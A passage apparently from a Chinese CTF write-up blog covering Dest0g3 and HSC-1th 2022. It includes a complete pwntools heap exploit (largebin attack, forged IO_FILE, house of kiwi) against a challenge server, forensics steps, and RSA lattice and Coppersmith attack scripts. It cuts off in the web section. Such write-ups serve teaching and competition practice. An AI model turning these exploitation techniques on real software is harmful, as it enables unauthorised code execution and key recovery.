goto LABEL_12; &#125; &#125; &#125;&#125;void add()&#123; int v0; // eax int v1; // eax int v2; // [rsp+0h] [rbp-10h] int v3; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] puts(&quot;Index: &quot;); read_n(); v2 = v0; puts(&quot;Size: &quot;); read_n(); v3 = v1; if ( v1 &gt; 1047 &amp;&amp; v1 &lt;= 4096 ) &#123; buf = malloc(v1); puts(&quot;Content&quot;); read(0, buf, v3); qword_4060[v2] = buf; dword_40E0[v2] = v3; &#125;&#125;ssize_t edit()&#123; int v0; // eax ssize_t result; // rax int v2; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v2 = v0; result = qword_4060[v0]; if ( result ) &#123; puts(&quot;Content&quot;); return read(0, (void *)qword_4060[v2], (int)dword_40E0[v2]); &#125; return result;&#125;int show()&#123; int v0; // eax __int64 v1; // rax int v3; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v3 = v0; v1 = qword_4060[v0]; if ( v1 ) LODWORD(v1) = puts((const char *)qword_4060[v3]); return v1;&#125;void delete()&#123; int v0; // eax puts(&quot;Index: &quot;); read_n(); if ( *((_QWORD *)&amp;qword_4060 + v0) ) free(*((void **)&amp;qword_4060 + v0));&#125; 同样是高版本（2.33）的UAF，最小申请0x417大小的chunk； 先用负idx修改stderr指针，再利用LargeBin Attack修改__pointer_chk_guard，伪造stderr修改vtable，最后改topchunk触发house of kiwi。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;r = remote(&#x27;node4.buuoj.cn&#x27;,&#x27;25443&#x27;)elf = ELF(&#x27;./pwn&#x27;) libc = ELF(&#x27;libc-2.33.so&#x27;) def add(idx,size,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendlineafter(&#x27;Size:&#x27;,str(size)) r.sendlineafter(&#x27;Content&#x27;,data)def edit(idx,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendafter(&#x27;Content&#x27;,data)def show(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def delete(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def ROL(content, key): tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;) return int(tmp[key:] + tmp[:key], 2)add(0,0x460,&#x27;a&#x27;*0x40 + p64(0)*4 + &#x27;cat flag&#x27;)add(1,0x420,&#x27;b&#x27;*0x40)add(2,0x440,&#x27;c&#x27;*0x40)add(3,0x420,&#x27;d&#x27;*0x40)delete(0)edit(0,&#x27;\\x01&#x27;)show(0)libc_base = (u64(r.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) &gt;&gt; 16) - libc.sym.__malloc_hook - 0x71print(hex(libc_base))edit(0,&#x27;\\x00&#x27;)add(4,0x470,&#x27;e&#x27;*0x40)delete(2)edit(0,&#x27;a&#x27;*0x10)show(0)r.recvuntil(&#x27;a&#x27;*0x10)heap_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x290global_max_fast = libc_base + 0x1e3e78stderr_chain = libc_base + 0x1e1648__pointer_chk_guard = libc_base + 0x1ed5b0print(hex(__pointer_chk_guard))edit(0,p64(libc_base+0x1e1000)*2 + p64(heap_addr) + p64(__pointer_chk_guard-0x20) + &#x27;\\n&#x27;)add(5,0x480,&#x27;f&#x27;*0x40) target = libc_base + libc.sym.systemio_cookie_jumps = libc_base + 0x1e1a20fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff) fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)*4fake_IO_FILE += p64(0) fake_IO_FILE += p64(0)*3fake_IO_FILE += p64(libc_base + 0x1e3660) fake_IO_FILE += p64(0)*7fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(io_cookie_jumps + 0x40)fake_IO_FILE += p64(heap_base + 0x300)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(target ^ (heap_base+0xb30),0x11))add(-4,0x500,fake_IO_FILE)add(6,0x700,&#x27;6&#x27;*0x40)delete(6)add(7,0x500,&#x27;7&#x27;*0x40)edit(6,&#x27;a&#x27;*0x508+p64(0x300))add(8,0xff0,&#x27;8&#x27;*0x40)r.interactive() ​ BLOCKCHAINWhere the flag？ 123456789contract find&#123; uint96 private a=7855; address private owner=msg.sender; bool private f=false; bool private t=true; string[] private flag=[flag1,flag2];&#125;//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc 应该是非预期，访问url进入合约，在交易0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1的InputData里，可以查看到Hex数据，转字符串可得到flag两截字符串：Dest0g3&#123;0n1y_u5e_priv4t3_i，5_n0t_s4f3_1n_B1okCh4in!&#125;。 ​ Easy predict 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576contract storageplace&#123; mapping(uint=&gt;string)private _flag; address owner; constructor()public&#123; owner=msg.sender; &#125; function flag() public view returns(string memory) &#123; require(msg.sender==owner); &#125; function buy(uint number) public returns(bytes1)&#123; require(msg.sender==owner); &#125;&#125;contract question&#123; mapping(address=&gt;bool)public regeister; mapping(address=&gt;uint)private seed; uint constant Price_Per_Char=10 ether; address owner; storageplace immutable Flag; constructor() public &#123; owner=msg.sender; storageplace _Flag = new storageplace(); Flag = _Flag; &#125; modifier isowner()&#123; require(msg.sender==owner,&quot;I think you are not the rignt person&quot;); _; &#125; function addRight(address tar)public isowner&#123; regeister[tar]=true; &#125; function removeRight(address tar)public isowner&#123; regeister[tar]=false; &#125; function regeist() public &#123; require(regeister[msg.sender]==false); regeister[msg.sender]=true; seed[msg.sender]=block.number+1; &#125; function buyflag(uint want) public payable returns(bytes1)&#123; require(msg.value==Price_Per_Char,&quot;is not free&quot;); return Flag.buy(want); &#125; function query(bytes32 answer) public view returns(string memory) &#123; require(regeister[msg.sender]); require(block.number &gt;seed[msg.sender],&quot;too early&quot;); bytes32 result = blockhash(seed[msg.sender]); require(answer==result,&quot;wrong answer&quot;); return Flag.flag(); &#125; function withdraw() public payable&#123; require(msg.sender==owner); msg.sender.transfer(address(this).balance); &#125;&#125;https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925 也是非预期，访问url进入交易0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925，在InputData里，可以查看到Hex数据，转字符串可得到flag五截字符串：Dest0g3&#123;t，_sup3r_e3，hi5_1s_4，ea5y_p，_r1ght?&#125;，按英文字面意思拼接，得：Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;。 ​ AIOCR OCR is very useful in ctf！ 更像Misc的AI题，png图片扭曲，应该宽度不对，CRC值爆破宽高： 123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag_pic.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() 得到正常图片： 找个在线OCR识别图里字符，得到的结果有部分字符不正确，手动修正，得到： 12345678910111213141516171819377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 以Hex保存为7z压缩包文件，解压得到 RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9，base64解码即flag：Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSC-1th 2022","slug":"match-HSC-1th-2022","date":"2022-02-20T08:28:40.000Z","updated":"2022-02-21T11:24:05.717Z","comments":true,"path":"2022/02/20/match-HSC-1th-2022/","link":"","permalink":"https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/","excerpt":"","text":"​ 本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。 Rank: 2 MISCSign-in 前往红客突击队公众号发送“HSC2019”并签到吧！ 公众号签到。 flag{HSC_W3LC0M3} ​ DORAEMONzip压缩包注释 哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？，爆破得到密码 376852； 得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码； 修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc} ​ 汝闻,人言否png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 4B 50 修改为 50 4B； 发现zip压缩包加密，注释 qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p 为键盘密码，在键盘上画出六个字母 WVALOU 为解压密码，得到 flag 文件，16进制查看发现为wav文件结构； 使用audacity查看wav文件，在频谱图发现flag：flag:e5353bb7b57578bd4da1c898a8e2d767 ​ PERFORMANCE-ART两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 504B0304140000000，为zip压缩包文件头。 依次还原所有字符： 12345678910504b03041400000008004a7e7253148e1e1e160000001400000006000000756e6b6e6f778bcaadc888322ec9f30b752df70ccfae8cca72b30400504b01021f001400000008004a7e7253148e1e1e1600000014000000060024000000000000002000000000000000756e6b6e6f770a0020000000000001001800778284ef50dcd7016b04efef50dcd701e1b0ef144fdcd701504b05060000000001000100580000003a0000000000 保存为zip文件，打开得到内容 ZmxhZ3tnNUEwIWkyZjF9，base64解码得flag：flag{g5A0!i2f1} ​ WIRESHARKzip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 b1,rgb,lsb,xy 通道隐写了一张png图片，提取： zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png 是一张二维码，扫描得到内容 wrsak..iehr370，栅栏解密 wireshark3.7.0； 解压最开始的zip压缩包得到 wireshark，16进制查看发现为pdf文件结构，文件头被修改过，还原为 %PDF （25 50 44 46）正常打开，内容无有用信息，猜想为PDF隐写； 使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt} ​ PCXP 百度网盘https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A 提取码：1qih 奶牛快传https://cowtransfer.com/s/b76470ddc9e04a 蓝奏云https://wwo.lanzouy.com/b030r1x4j 密码:cvi0 本题目文件PCXP1与PCXP2均需要下载！ 本题文件中flag{raw_Imfig3_mLs3}属于干扰项 两个dump内存的raw文件，用volatility分析。 其中一个发现 ffflaaagggg.rar 文件： 0x000000000227db70 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\ffflaaagggg.rar 根据提示，另一个发现 mirror.rar 文件： 0x00000000021221e0 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\mirror.rar 分别dumpfiles，按注释key:mirror 解压 mirror.rar，提取 mirror.png，发现后半部分有反转的png，reverse处理得到png内有密码 HSC-1th202248H ； 用密码解压 ffflaaagggg.rar，得到 secret.pcap，用tshark提取USB流量无结果； 查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写； 使用BlindWaterMark工具提取： python3 bwmforpy3.py decode 00000030.png 00000094.png out.png 得到flag：flag{Wat3rMarkPtysc} ​ CRYPTOEasy SignIn 5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in} ​ AFFINE flag{md5(result)} 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, c, a, b): for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) print(d)m = c = []a = b = assert (&quot;flag&quot; in m)print(&quot;加密后的密文为：&quot;)Cipher = encrypt(m, c, a, b)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()#print(flag)&quot;&quot;&quot;加密后的密文为：xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;&quot;&quot; 仿射密码加密，先根据密文和明文，爆破各位置存在 flag 字符串情况下对应的 a,b 值，再解密整串密文。 爆破求 a,b： 12345678910111213141516171819202122import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, a, b): c = [] for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return ds=&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;for a in range(50): for b in range(50): Cipher = encrypt(&#x27;flag&#x27;, a, b) for k in range(len(s)-3): if Cipher==s[k:k+4]: print(Cipher,a,b)# korv 11 17 解密： 12345678910111213141516171819a=11b=17def decrypt(m, a, b): import gmpy2 c = [] for i in range(len(m)): ch=m[i] t=((letter.index(ch) - b) * gmpy2.invert(a,62)) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return dm=decrypt(s, a, b)print(m)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()print(flag)# Oh62Affine1sSti1lN0tSecureEnoughToProtectflag# 2b9b99caae1cc49e5b5aacbc8cc22350 flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350} ​ LINE-GENERATION-TEST “Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)} 根据 enc 结果，猜测为 $\\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解： 1234567891011121314151617181920212223242526from z3 import *f=[Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(5)]out=[9,23,0,13,19]ss=Solver()ss.add((f[0]+f[1])%26==out[0])ss.add((f[1]+f[4])%26==out[1])ss.add((f[2]+f[3]+f[4])%26==out[2])ss.add((f[1]+f[2]+f[3])%26==out[3])ss.add((f[3])%26==out[4])for i in range(5): ss.add(f[i]&gt;=0) ss.add(f[i]&lt;26)ss.check()m=ss.model()print(m)res=&#x27;&#x27;for i in range(5): res+=chr(m[f[i]].as_long()+ord(&#x27;A&#x27;))print(res)# RSCTF MD5，得flag：flag{e4163deba70420c58acb87abcab34141} ​ LATTICE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *from gmpy2 import *flag = b&#x27;flag&#123;******&#125;&#x27;.strip(b&#x27;flag&#123;&#x27;).strip(b&#x27;&#125;&#x27;)_length = len(flag)f1, f2, f3 = [flag[_*_length//3:(_+1)*_length//3] for _ in range(3)]e = 0x10001# part1m1 = bytes_to_long(f1)p1 = getPrime(1024)q1 = getPrime(1024)n1 = p1 * q1phi1 = n1 - p1 - q1 + 1c1 = pow(m1, e, n1)e1 = invert(getPrime(730), phi1)e2 = invert(getPrime(730), phi1)print(f&quot;c1=&#123;c1&#125;&quot;)print(f&quot;n1=&#123;n1&#125;&quot;)print(f&quot;e1, e2=&#123;e1&#125;, &#123;e2&#125;&quot;)# c1=...# n1=...# e1, e2=...# part2m2 = bytes_to_long(f2)p2 = getPrime(1024)q2 = getPrime(1024)n2 = p2 * q2phi2 = n2 - p2 - q2 + 1c2 = pow(m2, e, n2)e1 = invert(getPrime(818), phi2)e2 = invert(getPrime(818), phi2)e3 = invert(getPrime(818), phi2)print(f&quot;c2=&#123;c2&#125;&quot;)print(f&quot;n2=&#123;n2&#125;&quot;)print(f&quot;e1, e2, e3=&#123;e1&#125;, &#123;e2&#125;, &#123;e3&#125;&quot;)# c2=...# n2=...# e1, e2, e3=...# part3m3 = bytes_to_long(f3)nl = []cl = []el = []d = getPrime(890)for _ in range(7): p3 = getPrime(1024) q3 = getPrime(1024) n3 = p3 * q3 phi3 = n3 - p3 - q3 + 1 e3 = invert(d, phi3) c3 = pow(m3, e3, n3) nl.append(n3) el.append(int(e3)) cl.append(int(c3))print(f&quot;nl=&#123;nl&#125;&quot;)print(f&quot;el=&#123;el&#125;&quot;)print(f&quot;cl=&#123;cl&#125;&quot;)# nl=[...]# el=[...]# cl=[...] RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。 Part1，2组 $e$ 的低解密指数攻击： 12345678910111213141516171819202122232425262728# Sageimport gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod(65537, phi) m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;89c63fd5-00c&#x27; Part2，3组 $e$ 的低解密指数攻击： 123456789101112131415161718192021222324252627282930313233343536373839# Sageimport gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod(65537, phi_) m = hex(power_mod(c, d, N))[2:] m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;f-4ae0-b369-&#x27; Part3，共私钥指数 $d$ 攻击： 12345678910111213141516171819202122232425262728293031323334from gmpy2 import *nl=[...]el=[...]cl=[...]ind=[]nl_s=sorted(nl)for i in range(7): ind.append(nl.index(nl_s[i]))print(ind)e=[]n=[]c=[]for i in range(7): e.append(el[ind[i]]) n.append(nl[ind[i]]) c.append(cl[ind[i]])M=iroot(int(n[6]),int(2))[0]a=[0]*8a[0]=[M,e[0],e[1],e[2],e[3],e[4],e[5],e[6]]a[1]=[0,-n[0],0,0,0,0,0,0]a[2]=[0,0,-n[1],0,0,0,0,0]a[3]=[0,0,0,-n[2],0,0,0,0]a[4]=[0,0,0,0,-n[3],0,0,0]a[5]=[0,0,0,0,0,-n[4],0,0]a[6]=[0,0,0,0,0,0,-n[5],0]a[7]=[0,0,0,0,0,0,0,-n[6]]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])//Mprint(d)print(bytes.fromhex(hex(pow(c[6],int(d),int(n[6])))[2:]))# b&#x27;5a3d94a20a2c&#x27; 连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c} ​ RSA flag{md5(result)} 1234567891011121314151617181920import gmpy2import sympyfrom Crypto.Util.number import *flag = b&#x27;????&#x27;z=getPrime(1024)p=sympy.nextprime(z)q=sympy.prevprime(10*z)n=p*qm=bytes_to_long(flag)e=0xe18ec=pow(m,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)#n= ...#c= ... 费马分解RSA，发现 $\\gcd(e,\\varphi(n))=2$，令 $e’=\\frac{e}{2},m’=m^2$， 先求出 $m’$，再利用Rabin算法求 $m$。 12345678910111213141516171819202122232425262728293031323334n = c = e = 0xe18eimport gmpy2p = gmpy2.iroot(n//10,2)[0]while 1: p = gmpy2.next_prime(p) if n%p==0: breakq = n//pf = (p-1)*(q-1)d = gmpy2.invert(e//2,f)mm = pow(c,d,n)print(mm)def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) m = rabin_decrypt(mm,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass# b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27; ​ BABY-RSA 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import *def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537hp = bin(p)[2:]c = pow(num, e, n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)f=open(&quot;key&quot;,&quot;w+&quot;,encoding=&#x27;utf-8&#x27;)for i in range(568): curnum = int(hp[i]) (status,out)=lfsr(status,mask) f.write(str(curnum ^ out))f.close()&#x27;&#x27;&#x27;n= ...c= ...&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;key:0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;&#x27;&#x27; RSA $p$ 高位泄露攻击+LFSR。 先用LFSR结果异或还原 $p$ 高位 $hp$： 123456789101112131415161718192021222324def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101c = list(&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;)c=[int(k) for k in c]hp = &#x27;&#x27;for i in range(568): (status,out) = lfsr(status,mask) hp += str(c[i]^out)hp = int(hp, 2)print(hp)# 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112 此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位： 123456789101112131415161718192021222324252627# Sagen = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703hp = 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112import stringdic = string.digits + &quot;abcdef&quot;for a in dic: for b in dic: pp = hex(hp) + a + b #p需要用0补全到1024位 pp += &#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27; #要加的数字与补全p时0的个数有关 pp = int(pp, 16) p_fake = pp+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake &amp; (2^pbits-2^kbits) #print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)) PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + pbar try: x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 print(x0 + pbar) except: pass # 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477 最后常规RSA： 1234567891011p = 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477n = 9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703c = 3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789q = n//pe = 0x10001import gmpy2f = (p-1)*(q-1)d = gmpy2.invert(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27; ​ WEBCLICK查看源码，找到 main.js，发现 